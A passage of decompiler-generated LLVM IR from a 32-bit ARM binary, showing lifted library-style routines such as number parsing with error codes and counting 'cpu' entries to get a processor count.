  store i32 %v1_12db832, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12dc0

bb59:                                             ; preds = %dec_label_pc_12dac
  %v3_12dac = icmp ult i32 %v0_12dac, %v1_12dac
  %v1_12db8 = add i32 %v0_12db8, 1
  store i32 %v1_12db8, i32* %r4.global-to-local, align 4
  br i1 %v3_12dac, label %dec_label_pc_12dc0, label %dec_label_pc_12dd8

dec_label_pc_12dc0:                               ; preds = %bb59, %.thread31
  %v1_12db836 = phi i32 [ %v1_12db832, %.thread31 ], [ %v1_12db8, %bb59 ]
  %v4_12dc82235 = phi i32 [ 1, %.thread31 ], [ 0, %bb59 ]
  %v1_12dc0 = load i32, i32* %sl.global-to-local, align 4
  %v3_12dc0 = icmp uge i32 %v3_12dd0, %v1_12dc0
  %v9_12dc0 = icmp eq i32 %v3_12dd0, %v1_12dc0
  %v2_12dc4 = xor i1 %v3_12dc0, true
  %v3_12dc4 = or i1 %v9_12dc0, %v2_12dc4
  br i1 %v3_12dc4, label %bb60, label %bb61

bb60:                                             ; preds = %dec_label_pc_12dc0
  br label %bb61

bb61:                                             ; preds = %dec_label_pc_12dc0, %bb60
  %v4_12dc8 = phi i32 [ %v4_12dc82235, %dec_label_pc_12dc0 ], [ 0, %bb60 ]
  %v2_12dc8 = xor i1 %v9_12dc0, true
  %v3_12dc8 = and i1 %v3_12dc0, %v2_12dc8
  br i1 %v3_12dc8, label %bb62, label %thread-pre-split

bb62:                                             ; preds = %bb61
  %v5_12dc8 = urem i32 %v4_12dc8, 2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb61, %bb62
  %v0_12dcc = phi i32 [ %v5_12dc8, %bb62 ], [ %v4_12dc8, %bb61 ]
  %v2_12dcc = icmp eq i32 %v0_12dcc, 0
  br i1 %v2_12dcc, label %bb63, label %dec_label_pc_12dd8

bb63:                                             ; preds = %thread-pre-split
  %v4_12dd0 = mul i32 %v0_12dac, %v1_12da4
  %v5_12dd0 = add i32 %v4_12dd0, %v3_12dd0
  store i32 %v5_12dd0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12d78

dec_label_pc_12dd8:                               ; preds = %bb59, %thread-pre-split
  %v0_12dd8 = call i32 @function_11204()
  %v0_12de0 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_12de0, i32* %ip.global-to-local, align 4
  %v0_12de4 = load i32, i32* @r7, align 4
  %v2_12de4 = and i32 %v0_12de4, %v0_12ca8
  store i32 %v2_12de4, i32* @r7, align 4
  %v2_12dec = inttoptr i32 %v0_12dd8 to i32*
  store i32 34, i32* %v2_12dec, align 4
  %v0_12d78.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12d78

dec_label_pc_12df4.loopexit:                      ; preds = %bb58
  %v0_12df4.pre = load i32, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_12df4

dec_label_pc_12df4:                               ; preds = %.thread, %dec_label_pc_12df4.loopexit
  %v2_12df8 = phi i32 [ %v0_12df4.pre, %dec_label_pc_12df4.loopexit ], [ %v0_12c9c, %.thread ]
  %v2_12df4 = icmp eq i32 %v2_12df8, 0
  br i1 %v2_12df4, label %bb65, label %bb64

bb64:                                             ; preds = %dec_label_pc_12df4
  %v1_12df8 = load i32, i32* %r6.global-to-local, align 4
  %v3_12df8 = inttoptr i32 %v2_12df8 to i32*
  store i32 %v1_12df8, i32* %v3_12df8, align 4
  br label %bb65

bb65:                                             ; preds = %dec_label_pc_12df4, %bb64
  %v0_12e00 = load i32, i32* @r7, align 4
  %v2_12e00 = icmp eq i32 %v0_12e00, 0
  %. = select i1 %v2_12e00, i32 2147483647, i32 -2147483648
  store i32 %., i32* %r4.global-to-local, align 4
  %v2_12e0c = icmp eq i32 %v0_12ca8, 0
  %v0_12e30.pre.pre = load i32, i32* %ip.global-to-local, align 4
  br i1 %v2_12e0c, label %dec_label_pc_12e28, label %bb68

bb68:                                             ; preds = %bb65
  %tmp73 = icmp ugt i32 %v0_12e30.pre.pre, %.
  br i1 %tmp73, label %dec_label_pc_12e18, label %dec_label_pc_12e28

dec_label_pc_12e18:                               ; preds = %bb68
  %v0_12e18 = call i32 @function_11204()
  %v2_12e20 = inttoptr i32 %v0_12e18 to i32*
  store i32 34, i32* %v2_12e20, align 4
  %v0_12e24 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_12e24, i32* %ip.global-to-local, align 4
  %v0_12e28.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_12e28

dec_label_pc_12e28:                               ; preds = %bb68, %bb65, %dec_label_pc_12e18
  %v0_12e30.pre = phi i32 [ %v0_12e30.pre.pre, %bb68 ], [ %v0_12e24, %dec_label_pc_12e18 ], [ %v0_12e30.pre.pre, %bb65 ]
  %v0_12e28 = phi i32 [ %v0_12e00, %bb68 ], [ %v0_12e28.pre, %dec_label_pc_12e18 ], [ %v0_12e00, %bb65 ]
  %v2_12e28 = icmp eq i32 %v0_12e28, 0
  br i1 %v2_12e28, label %dec_label_pc_12e28._crit_edge, label %bb69

bb69:                                             ; preds = %dec_label_pc_12e28
  %v2_12e2c = sub i32 0, %v0_12e30.pre
  store i32 %v2_12e2c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12e28._crit_edge

dec_label_pc_12e28._crit_edge:                    ; preds = %dec_label_pc_12e28, %bb69
  %v0_12e30 = phi i32 [ %v2_12e2c, %bb69 ], [ %v0_12e30.pre, %dec_label_pc_12e28 ]
  store i32 %v3_12c88, i32* @r4, align 4
  ret i32 %v0_12e30

; uselistorder directives
  uselistorder i32 %v0_12e30.pre, { 1, 0 }
  uselistorder i32 %v0_12e30.pre.pre, { 1, 2, 0 }
  uselistorder i32 %v4_12dc8, { 1, 0 }
  uselistorder i1 %v3_12dc0, { 1, 0 }
  uselistorder i32 %v1_12dc0, { 1, 0 }
  uselistorder i32 %v1_12d8c, { 1, 0 }
  uselistorder i32 %v1_12d84, { 1, 0 }
  uselistorder i32 %v0_12db8, { 1, 0, 2 }
  uselistorder i32 %v0_12d78, { 1, 0 }
  uselistorder i32 %v3_12d28, { 1, 0 }
  uselistorder i32 %v1_12d1c, { 1, 0, 2 }
  uselistorder i32 %v0_12cec, { 0, 1, 3, 2 }
  uselistorder i32 %v0_12ca8, { 1, 0 }
  uselistorder i32 %v0_12ca0, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r6.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %r5.global-to-local, { 4, 5, 0, 1, 2, 3, 6 }
  uselistorder i32* %r4.global-to-local, { 3, 4, 1, 0, 2 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 6, 2, 3, 4, 5, 7, 8 }
  uselistorder i32 ()* @function_10878, { 5, 3, 2, 1, 4, 0 }
  uselistorder i32 (i32, i32)* @function_10974, { 3, 2, 0, 6, 1, 5, 4 }
  uselistorder i32 34, { 1, 2, 0, 4, 5, 3, 6 }
  uselistorder i8 48, { 1, 0, 2 }
  uselistorder i32 -17, { 1, 0 }
  uselistorder i8 45, { 0, 2, 1 }
  uselistorder label %dec_label_pc_12e28._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_12e28, { 2, 0, 1 }
  uselistorder label %bb65, { 1, 0 }
  uselistorder label %dec_label_pc_12df4, { 1, 0 }
  uselistorder label %dec_label_pc_12dd8, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb61, { 1, 0 }
  uselistorder label %bb58, { 2, 1, 0 }
  uselistorder label %dec_label_pc_12d7c, { 1, 0 }
  uselistorder label %dec_label_pc_12d78, { 1, 0 }
  uselistorder label %bb56, { 2, 1, 0 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12cf0, { 1, 0 }
  uselistorder label %dec_label_pc_12cec, { 1, 0 }
  uselistorder label %dec_label_pc_12cb4, { 1, 0 }
}

define i32 @function_12e48(i32 %arg1) local_unnamed_addr {
dec_label_pc_12e48:
  %stack_var_-16 = alloca i32, align 4
  store i32 124820, i32* @r5, align 4
  %v4_12e54 = load i32, i32* inttoptr (i32 124908 to i32*), align 4
  store i32 %v4_12e54, i32* @r4, align 4
  %v2_12e5c = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* @r6, align 4
  %v4_12e74 = load i32, i32* inttoptr (i32 124892 to i32*), align 4
  call void @__pseudo_branch(i32 %v4_12e74)
  %v0_12e88 = load i32, i32* @r5, align 4
  %v2_12e88 = add i32 %v0_12e88, 16
  %v3_12e88 = inttoptr i32 %v2_12e88 to i32*
  %v4_12e88 = load i32, i32* %v3_12e88, align 4
  call void @__pseudo_branch(i32 %v4_12e88)
  %v4_12e98 = load i32, i32* @global_var_1ea30.420, align 4
  %v2_12e9c = icmp eq i32 %v4_12e98, 0
  br i1 %v2_12e9c, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_12e48
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_12e48, %bb
  %v2_12ea8 = xor i1 %v2_12e9c, true
  call void @__pseudo_cond_branch(i1 %v2_12ea8, i32 %v4_12e98)
  store i32 %v2_12e5c, i32* @r0, align 4
  %v0_12eb8 = load i32, i32* @r5, align 4
  %v2_12eb8 = add i32 %v0_12eb8, 24
  %v3_12eb8 = inttoptr i32 %v2_12eb8 to i32*
  %v4_12eb8 = load i32, i32* %v3_12eb8, align 4
  call void @__pseudo_branch(i32 %v4_12eb8)
  %v0_12ec4 = call i32 @function_13714()
  %v0_12ecc = load i32, i32* @r5, align 4
  %v9_12ecc = icmp eq i32 %v0_12ecc, 39908
  br i1 %v9_12ecc, label %bb9, label %bb8

bb8:                                              ; preds = %.thread
  br label %bb9

bb9:                                              ; preds = %.thread, %bb8
  %v2_12ed4 = xor i1 %v9_12ecc, true
  call void @__pseudo_cond_branch(i1 %v2_12ed4, i32 ptrtoint (i32* @global_var_14bb0.423 to i32))
  %v0_12ed8 = load i32, i32* @r6, align 4
  %v1_12edc = call i32 @function_1417c(i32 %v0_12ed8)
  %v0_12ee0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12ee0, label %bb10, label %.thread6

bb10:                                             ; preds = %bb9
  %v3_12ee0 = load i32, i32* @sb, align 4
  %v8_12ee0 = lshr i32 %v4_12eb8, %v3_12ee0
  %v9_12ee0 = and i32 %v8_12ee0, %v1_12edc
  store i32 %v9_12ee0, i32* @fp, align 4
  %v2_12ee4 = load i32, i32* @r8, align 4
  %v2_12ef4 = load i32, i32* @r2, align 4
  %v3_12ef4 = mul i32 %v2_12ef4, %v4_12eb8
  %v8_12ef8 = shl i32 %v2_12ee4, %v3_12ef4
  %v9_12ef8 = and i32 %v8_12ef8, %v3_12ef4
  br label %.thread6

.thread6:                                         ; preds = %bb9, %bb10
  %v10_12ef8 = phi i32 [ %v1_12edc, %bb9 ], [ %v9_12ef8, %bb10 ]
  ret i32 %v10_12ef8

; uselistorder directives
  uselistorder i32 %v1_12edc, { 1, 0 }
  uselistorder i1 %v9_12ecc, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %bb9, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_12f00(i32 %arg1) local_unnamed_addr {
dec_label_pc_12f00:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_12f00 = load i32, i32* @r4, align 4
  %v6_12f00 = load i32, i32* @lr, align 4
  store i32 %arg1, i32* @ip, align 4
  %v2_12f04 = icmp eq i32 %arg1, 0
  store i32 0, i32* @r4, align 4
  br i1 %v2_12f04, label %dec_label_pc_12f98, label %dec_label_pc_12f14

dec_label_pc_12f14:                               ; preds = %dec_label_pc_12f00
  %v2_12f24 = ptrtoint i32* %stack_var_-44 to i32
  store i32 65536, i32* %stack_var_-24, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v3_12f38 = call i32 @function_13b8c(i32 17, i32 0, i32 %v2_12f24)
  %v3_12f3c = load i32, i32* %stack_var_-44, align 4
  %v7_12f40 = icmp eq i32 %v3_12f3c, 1
  br i1 %v7_12f40, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_12f14
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_12f14, %bb
  call void @__pseudo_cond_branch(i1 %v7_12f40, i32 ptrtoint (i32* @global_var_10da4.425 to i32))
  %v2_12f54 = ptrtoint i32* %stack_var_-16 to i32
  %v2_12f5c = call i32 @function_140c0(i32 %v2_12f54, i32 %v2_12f54)
  %v2_12f60 = icmp eq i32 %v2_12f5c, 0
  br i1 %v2_12f60, label %bb19, label %bb18

bb18:                                             ; preds = %.thread2
  %v3_12f74 = load i32, i32* %stack_var_-16, align 4
  br label %bb19

bb19:                                             ; preds = %.thread2, %bb18
  %storemerge = phi i32 [ %v3_12f74, %bb18 ], [ 0, %.thread2 ]
  store i32 %storemerge, i32* %r4.global-to-local, align 4
  %v3_12f84 = load i32, i32* %stack_var_-24, align 4
  %v1_12f88 = and i32 %v3_12f84, 65536
  %v2_12f88 = icmp eq i32 %v1_12f88, 0
  br i1 %v2_12f88, label %bb20, label %.thread6

bb20:                                             ; preds = %bb19
  br label %.thread6

.thread6:                                         ; preds = %bb19, %bb20
  call void @__pseudo_cond_branch(i1 %v2_12f88, i32 ptrtoint (i32* @global_var_10da4.425 to i32))
  %v0_12f98.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12f98

dec_label_pc_12f98:                               ; preds = %dec_label_pc_12f00, %.thread6
  %v0_12f98 = phi i32 [ %v0_12f98.pre, %.thread6 ], [ 0, %dec_label_pc_12f00 ]
  store i32 %v3_12f00, i32* @r4, align 4
  store i32 %v6_12f00, i32* @lr, align 4
  ret i32 %v0_12f98

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @function_13b8c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12f98, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_12fac() local_unnamed_addr {
dec_label_pc_12fac:
  %stack_var_-36 = alloca i32, align 4
  store i32 124820, i32* @r4, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_16418.429 to i32), i32* @r0, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* %stack_var_-36, align 4
  %v2_12fcc = call i32 @function_145f0(i32 ptrtoint ([11 x i8]* @global_var_16418.429 to i32))
  store i32 %v2_12fcc, i32* @r6, align 4
  %v2_12fd0 = icmp eq i32 %v2_12fcc, 0
  br i1 %v2_12fd0, label %dec_label_pc_13050, label %dec_label_pc_12fd8

dec_label_pc_12fd8:                               ; preds = %dec_label_pc_12fac
  store i32 224, i32* @sl, align 4
  store i32 ptrtoint (i32* @global_var_16424.432 to i32), i32* @r8, align 4
  %v2_12fe4 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_12fe4, i32* @r7, align 4
  br label %bb18

dec_label_pc_12fec:                               ; preds = %bb18
  %v3_12fec = load i32, i32* %stack_var_-36, align 4
  %v1_12ff0 = inttoptr i32 %v3_12fec to i32*
  %v2_12ff0 = load i32, i32* %v1_12ff0, align 4
  %v1_12ff4 = inttoptr i32 %v2_12ff0 to i8*
  %v2_12ff4 = load i8, i8* %v1_12ff4, align 1
  %v7_12ff8 = icmp eq i8 %v2_12ff4, 99
  br i1 %v7_12ff8, label %dec_label_pc_13000, label %.backedge3

dec_label_pc_13000:                               ; preds = %dec_label_pc_12fec
  %v1_13000 = add i32 %v2_12ff0, 1
  %v2_13000 = inttoptr i32 %v1_13000 to i8*
  %v3_13000 = load i8, i8* %v2_13000, align 1
  %v7_13004 = icmp eq i8 %v3_13000, 112
  br i1 %v7_13004, label %dec_label_pc_1300c, label %.backedge3

dec_label_pc_1300c:                               ; preds = %dec_label_pc_13000
  %v1_1300c = add i32 %v2_12ff0, 2
  %v2_1300c = inttoptr i32 %v1_1300c to i8*
  %v3_1300c = load i8, i8* %v2_1300c, align 1
  %v7_13010 = icmp eq i8 %v3_1300c, 117
  br i1 %v7_13010, label %dec_label_pc_13018, label %.backedge3

dec_label_pc_13018:                               ; preds = %dec_label_pc_1300c
  %v1_13018 = add i32 %v2_12ff0, 3
  %v2_13018 = inttoptr i32 %v1_13018 to i8*
  %v3_13018 = load i8, i8* %v2_13018, align 1
  %v4_13018 = zext i8 %v3_13018 to i32
  %v0_1301c = load i32, i32* @r4, align 4
  %v1_1301c = load i32, i32* @sl, align 4
  %v2_1301c = add i32 %v1_1301c, %v0_1301c
  %v3_1301c = inttoptr i32 %v2_1301c to i32*
  %v4_1301c = load i32, i32* %v3_1301c, align 4
  %v2_13020 = mul nuw nsw i32 %v4_13018, 2
  %v2_13024 = add i32 %v4_1301c, %v2_13020
  %v3_13024 = inttoptr i32 %v2_13024 to i16*
  %v4_13024 = load i16, i16* %v3_13024, align 2
  %v1_13028 = and i16 %v4_13024, 8
  %v2_13028 = icmp eq i16 %v1_13028, 0
  br i1 %v2_13028, label %.backedge3, label %bb

bb:                                               ; preds = %dec_label_pc_13018
  %v1_1302c = load i32, i32* @r5, align 4
  %v2_1302c = add i32 %v1_1302c, 1
  store i32 %v2_1302c, i32* @r5, align 4
  br label %.backedge3

.backedge3:                                       ; preds = %bb, %dec_label_pc_13018, %dec_label_pc_12fec, %dec_label_pc_13000, %dec_label_pc_1300c
  %v0_13030.pre = load i32, i32* @r6, align 4
  %v0_1303c.pre = load i32, i32* @r8, align 4
  br label %bb18

bb18:                                             ; preds = %.backedge3, %dec_label_pc_12fd8
  %v0_1303c = phi i32 [ %v0_1303c.pre, %.backedge3 ], [ ptrtoint (i32* @global_var_16424.432 to i32), %dec_label_pc_12fd8 ]
  %v0_13030 = phi i32 [ %v0_13030.pre, %.backedge3 ], [ %v2_12fcc, %dec_label_pc_12fd8 ]
  %v4_13040 = inttoptr i32 %v0_13030 to i32*
  %v5_13040 = call i32 @function_14294(i32* %v4_13040, i32 %v2_12fe4, i32 258, i32 %v0_1303c)
  %v2_13044 = icmp eq i32 %v5_13040, 0
  br i1 %v2_13044, label %dec_label_pc_130b4, label %dec_label_pc_12fec

dec_label_pc_13050:                               ; preds = %dec_label_pc_12fac
  store i32 ptrtoint ([14 x i8]* @global_var_16428.435 to i32), i32* @r0, align 4
  %v2_13058 = call i32 @function_145f0(i32 ptrtoint ([14 x i8]* @global_var_16428.435 to i32))
  store i32 %v2_13058, i32* @r6, align 4
  %v2_1305c = icmp eq i32 %v2_13058, 0
  br i1 %v2_1305c, label %bb19, label %dec_label_pc_13068

bb19:                                             ; preds = %dec_label_pc_13050
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_130b4

dec_label_pc_13068:                               ; preds = %dec_label_pc_13050
  store i32 ptrtoint ([10 x i8]* @global_var_16438.437 to i32), i32* @r8, align 4
  store i32 ptrtoint (i32* @global_var_1645c.439 to i32), i32* @r7, align 4
  %v2_13078 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_13078, i32* @r4, align 4
  br label %bb21

dec_label_pc_13080:                               ; preds = %bb21
  %v0_130ac = load i32, i32* @r8, align 4
  %v1_130ac = inttoptr i32 %v0_130ac to i8*
  %v3_13080 = load i32, i32* %stack_var_-36, align 4
  %v1_13084 = inttoptr i32 %v3_13080 to i32*
  %v2_13084 = load i32, i32* %v1_13084, align 4
  store i32 %v2_13084, i32* @r1, align 4
  %v4_13088 = call i32 @function_158a0(i8* %v1_130ac, i32 %v2_13084)
  %v2_1308c = icmp eq i32 %v4_13088, 0
  br i1 %v2_1308c, label %bb20, label %.backedge

bb20:                                             ; preds = %dec_label_pc_13080
  %v1_13090 = load i32, i32* @r5, align 4
  %v2_13090 = add i32 %v1_13090, 1
  store i32 %v2_13090, i32* @r5, align 4
  br label %.backedge

.backedge:                                        ; preds = %bb20, %dec_label_pc_13080
  %v0_1309c.pre = load i32, i32* @r7, align 4
  %v0_130a0.pre = load i32, i32* @r6, align 4
  br label %bb21

bb21:                                             ; preds = %.backedge, %dec_label_pc_13068
  %v0_130a0 = phi i32 [ %v0_130a0.pre, %.backedge ], [ %v2_13058, %dec_label_pc_13068 ]
  %v0_1309c = phi i32 [ %v0_1309c.pre, %.backedge ], [ ptrtoint (i32* @global_var_1645c.439 to i32), %dec_label_pc_13068 ]
  %v4_130a4 = inttoptr i32 %v0_130a0 to i32*
  %v5_130a4 = call i32 @function_14294(i32* %v4_130a4, i32 %v2_13078, i32 459266, i32 %v0_1309c)
  %v2_130a8 = icmp eq i32 %v5_130a4, 0
  br i1 %v2_130a8, label %dec_label_pc_130b4, label %dec_label_pc_13080

dec_label_pc_130b4:                               ; preds = %bb18, %bb21, %bb19
  %v0_130b4 = load i32, i32* @r6, align 4
  %v1_130b8 = inttoptr i32 %v0_130b4 to i32*
  %v2_130b8 = call i32 @function_145bc(i32* %v1_130b8)
  %v0_130bc = load i32, i32* @r5, align 4
  %v2_130bc = icmp eq i32 %v0_130bc, 0
  %.v0_130bc = select i1 %v2_130bc, i32 1, i32 %v0_130bc
  ret i32 %.v0_130bc

; uselistorder directives
  uselistorder i32* %stack_var_-36, { 0, 3, 1, 4, 2 }
  uselistorder i32 (i32)* @function_145f0, { 1, 0 }
  uselistorder label %dec_label_pc_130b4, { 1, 2, 0 }
  uselistorder label %.backedge3, { 0, 1, 4, 3, 2 }
}

define i32 @function_130f8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_130f8:
  %r2.global-to-local = alloca i32, align 4
  %tmp = icmp ult i32 %arg1, 241
  br i1 %tmp, label %bb, label %dec_label_pc_134e0

bb:                                               ; preds = %dec_label_pc_130f8
  %v7_1310c = mul i32 %arg1, 4
  %v8_1310c = add i32 %v7_1310c, ptrtoint (i32* @global_var_13114.442 to i32)
  call void @__pseudo_branch(i32 %v8_1310c)
  br label %dec_label_pc_134e0

dec_label_pc_134e0:                               ; preds = %bb, %dec_label_pc_130f8
  %v0_134e0 = call i32 @function_11204()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_134ec = inttoptr i32 %v0_134e0 to i32*
  store i32 22, i32* %v2_134ec, align 4
  %v0_1369c = load i32, i32* %r2.global-to-local, align 4
  ret i32 %v0_1369c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_13714() local_unnamed_addr {
dec_label_pc_13738.lr.ph:
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_13714 = load i32, i32* @r4, align 4
  store i32 %v3_13714, i32* %stack_var_-16, align 4
  store i32 124812, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13738

dec_label_pc_13738:                               ; preds = %dec_label_pc_13738.dec_label_pc_13738_crit_edge, %dec_label_pc_13738.lr.ph
  %v1_13738 = phi i32 [ %v1_13744, %dec_label_pc_13738.dec_label_pc_13738_crit_edge ], [ 0, %dec_label_pc_13738.lr.ph ]
  %v0_13738 = phi i32 [ %v0_13738.pre, %dec_label_pc_13738.dec_label_pc_13738_crit_edge ], [ 124812, %dec_label_pc_13738.lr.ph ]
  %v4_13738 = mul i32 %v1_13738, 4
  %v5_13738 = add i32 %v4_13738, %v0_13738
  %v6_13738 = inttoptr i32 %v5_13738 to i32*
  %v7_13738 = load i32, i32* %v6_13738, align 4
  call void @__pseudo_branch(i32 %v7_13738)
  %v0_13744 = load i32, i32* %r4.global-to-local, align 4
  %v1_13744 = add i32 %v0_13744, -1
  store i32 %v1_13744, i32* %r4.global-to-local, align 4
  %v2_13744 = icmp eq i32 %v0_13744, 0
  br i1 %v2_13744, label %dec_label_pc_1374c, label %dec_label_pc_13738.dec_label_pc_13738_crit_edge

dec_label_pc_13738.dec_label_pc_13738_crit_edge:  ; preds = %dec_label_pc_13738
  %v0_13738.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13738

dec_label_pc_1374c:                               ; preds = %dec_label_pc_13738
  %v4_13750 = load i32, i32* @global_var_1ea40.455, align 4
  %v2_13754 = icmp eq i32 %v4_13750, 0
  br i1 %v2_13754, label %bb16, label %bb

bb:                                               ; preds = %dec_label_pc_1374c
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_1374c, %bb
  %v2_1375c = xor i1 %v2_13754, true
  call void @__pseudo_cond_branch(i1 %v2_1375c, i32 %v4_13750)
  %v4_13764 = load i32, i32* @global_var_1ea44.457, align 4
  %v2_13768 = icmp eq i32 %v4_13764, 0
  br i1 %v2_13768, label %bb18, label %bb17

bb17:                                             ; preds = %bb16
  br label %bb18

bb18:                                             ; preds = %bb16, %bb17
  %v2_13770 = xor i1 %v2_13768, true
  call void @__pseudo_cond_branch(i1 %v2_13770, i32 %v4_13764)
  %v2_13774 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_13774, i32* %r4.global-to-local, align 4
  %v1_13778 = load i32, i32* @r0, align 4
  ret i32 %v1_13778

; uselistorder directives
  uselistorder i32 %v1_13744, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 3, 2, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
}

define i32 @function_13790(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13790:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %v2_137a4 = call i32 @function_10c10(i32 %arg1, i32 1)
  %v3_137ac = icmp eq i32 %v2_137a4, -1
  store i32 124820, i32* @r3, align 4
  br i1 %v3_137ac, label %dec_label_pc_137b8, label %dec_label_pc_137d0

dec_label_pc_137b8:                               ; preds = %dec_label_pc_13790
  %v0_137bc = load i32, i32* %r5.global-to-local, align 4
  %v3_137c4 = call i32 @function_109e8(i32 ptrtoint ([10 x i8]* @global_var_16460.460 to i32), i32 %v0_137bc)
  %v1_137c8 = load i32, i32* %r4.global-to-local, align 4
  %v1_137cc = icmp ne i32 %v3_137c4, %v1_137c8
  call void @__pseudo_cond_branch(i1 %v1_137cc, i32 ptrtoint (i32* @global_var_12b24.461 to i32))
  br label %dec_label_pc_137d0

dec_label_pc_137d0:                               ; preds = %dec_label_pc_13790, %dec_label_pc_137b8
  %v1_137d8 = phi i32 [ %v2_137a4, %dec_label_pc_13790 ], [ %v3_137c4, %dec_label_pc_137b8 ]
  ret i32 %v1_137d8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_137d0, { 1, 0 }
}

define i32 @function_137e4(i32 %arg1) local_unnamed_addr {
dec_label_pc_137e4:
  %r4.global-to-local = alloca i32, align 4
  store i32 124820, i32* %r4.global-to-local, align 4
  %v4_137f4 = load i32, i32* inttoptr (i32 124912 to i32*), align 16
  %v1_137f8 = inttoptr i32 %v4_137f4 to i32*
  %v2_137f8 = load i32, i32* %v1_137f8, align 4
  %v2_137fc = icmp eq i32 %v2_137f8, 0
  br i1 %v2_137fc, label %dec_label_pc_13804, label %dec_label_pc_13838

dec_label_pc_13804:                               ; preds = %dec_label_pc_137e4
  %v4_13808 = load i32, i32* inttoptr (i32 124872 to i32*), align 8
  %v2_13810 = icmp eq i32 %v4_13808, 0
  store i32 4096, i32* %v1_137f8, align 4
  br i1 %v2_13810, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_13804
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_13804, %bb
  %v2_1381c = xor i1 %v2_13810, true
  call void @__pseudo_cond_branch(i1 %v2_1381c, i32 %v4_13808)
  %v0_13824 = load i32, i32* %r4.global-to-local, align 4
  %v2_1382c = icmp eq i32 %v0_13824, 40064
  br i1 %v2_1382c, label %bb6, label %bb5

bb5:                                              ; preds = %bb4
  br label %bb6

bb6:                                              ; preds = %bb4, %bb5
  %v2_13834 = xor i1 %v2_1382c, true
  call void @__pseudo_cond_branch(i1 %v2_13834, i32 ptrtoint (i32* @global_var_14b14.466 to i32))
  br label %dec_label_pc_13838

dec_label_pc_13838:                               ; preds = %dec_label_pc_137e4, %bb6
  %v1_1383c = load i32, i32* @r0, align 4
  ret i32 %v1_1383c

; uselistorder directives
  uselistorder i1 %v2_1382c, { 1, 0 }
  uselistorder label %dec_label_pc_13838, { 1, 0 }
  uselistorder label %bb6, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @function_13850(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_13850:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  %tmp49 = call i32 @__decompiler_undefined_function_0()
  %tmp50 = call i32 @__decompiler_undefined_function_0()
  %tmp51 = call i32 @__decompiler_undefined_function_0()
  %tmp52 = call i32 @__decompiler_undefined_function_0()
  %tmp53 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-120 = alloca i32, align 4
  store i32 %tmp, i32* @r7, align 4
  %v1_13858 = add i32 %tmp, 4
  store i32 %v1_13858, i32* %ip.global-to-local, align 4
